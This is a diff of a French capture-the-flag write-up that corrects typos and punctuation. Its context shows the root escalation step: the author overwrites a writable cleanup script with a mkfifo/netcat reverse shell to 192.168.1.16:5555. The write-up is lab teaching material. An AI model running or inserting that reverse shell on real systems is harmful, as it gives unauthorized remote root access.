@@ -5,7 +5,7 @@ date:   2020-08-06 10:00:00 +0200
 published: true
 ---
 
-# Information sur la box :
+# Informations sur la box :
 
 * **Difficulté** : Facile
 * **Description** : *It is a simple machine that replicates a real scenario that I found. The goal is to get two flags, one that is in the secret folder and the other that can only be read by the root user*
@@ -434,7 +434,7 @@ ls -la /var/www/html/tmp/clean.sh
 -rw-r--r-- 1 www-data www-data 84 Aug  6 19:07 /var/www/html/tmp/clean.sh
 ```
 
-Bingo ! Il nous suffit de le modifier pour ajouter notre reverse shell qui sera exécuter par ``root`` :
+Bingo ! Il nous suffit de le modifier pour ajouter notre reverse shell qui sera exécuté par ``root`` :
 
 ```bash
 echo 'rm /tmp/p; mkfifo /tmp/p; cat /tmp/p|/bin/sh -i 2>&1 | nc 192.168.1.16 5555 >/tmp/p' > clean.sh
@@ -454,6 +454,6 @@ flag{d9b368018e912b541a4eb68399c5e94a}
 
 Cette box n'était pas très compliquée même si elle m'a fait chercher pendant quelques temps comment **bypass les espaces** dans l'URL ainsi que le service qui tournait en fond mais qui n'était pas dans les **cron jobs**.
 
-Merci à ([@over_jt](https://twitter.com/over_jt)) pour cette box !
+Merci à [@over_jt](https://twitter.com/over_jt) pour cette box !
 
 Les prochaines fois faîtes bien **attention** ! Si vous ne voyez pas de cron jobs actifs cela ne veut pas dire qu'il n'y a rien qui tourne **périodiquement** sur la machine !
